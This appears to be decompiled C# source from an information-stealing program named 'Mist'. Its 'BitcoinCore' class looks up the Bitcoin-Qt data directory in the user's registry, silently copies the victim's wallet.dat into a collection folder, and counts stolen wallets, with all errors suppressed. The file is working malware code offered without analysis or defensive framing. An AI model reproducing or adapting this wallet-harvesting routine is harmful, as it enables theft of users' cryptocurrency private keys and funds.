using System;
using System.IO;
using Microsoft.Win32;

namespace Mist
{
	// Token: 0x02000066 RID: 102
	internal class BitcoinCore
	{
		// Token: 0x06000285 RID: 645 RVA: 0x0001242C File Offset: 0x0001062C
		public static void BCStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
						BitcoinCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400015A RID: 346
		public static int count;
	}
}
